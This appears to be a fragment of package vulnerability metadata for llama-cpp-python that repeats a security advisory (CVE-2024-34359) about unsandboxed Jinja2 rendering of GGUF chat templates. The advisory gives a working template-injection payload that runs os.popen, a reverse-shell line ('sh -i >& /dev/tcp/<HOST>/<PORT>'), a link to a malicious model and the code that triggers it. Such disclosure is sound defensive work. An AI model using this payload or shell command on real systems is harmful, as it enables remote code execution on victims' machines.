self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.56":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.56/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.56","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"cae7a96c0405c73e9b86fde675c30456d231e4a6bc46a69642587318856bf2d4","md5":"97cd89741fdfb6f986a3fdb90a6cfb49","sha256":"9c82db80e929ae93c2ab069a76a8a52aac82479cf9d0523c3550af48554cc785"},"downloads":-1,"filename":"llama_cpp_python-0.2.56.tar.gz","has_sig":false,"md5_digest":"97cd89741fdfb6f986a3fdb90a6cfb49","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":36875728,"upload_time":"2024-03-09T02:17:56","upload_time_iso_8601":"2024-03-09T02:17:56.301249Z","url":"https://files.pythonhosted.org/packages/ca/e7/a96c0405c73e9b86fde675c30456d231e4a6bc46a69642587318856bf2d4/llama_cpp_python-0.2.56.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.57":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.57/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.57","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"8eae551f28037d9a49693f7b09b0e22912be4e839b1af5f4ae6ab721162a37a4","md5":"9c89eb847684132b6f7b8d7018474624","sha256":"bd81dbc4bc03b7deca3be0496330705d4c53bba726f7c3a47d556c7ec2452304"},"downloads":-1,"filename":"llama_cpp_python-0.2.57.tar.gz","has_sig":false,"md5_digest":"9c89eb847684132b6f7b8d7018474624","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":36947248,"upload_time":"2024-03-18T15:41:51","upload_time_iso_8601":"2024-03-18T15:41:51.958663Z","url":"https://files.pythonhosted.org/packages/8e/ae/551f28037d9a49693f7b09b0e22912be4e839b1af5f4ae6ab721162a37a4/llama_cpp_python-0.2.57.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = 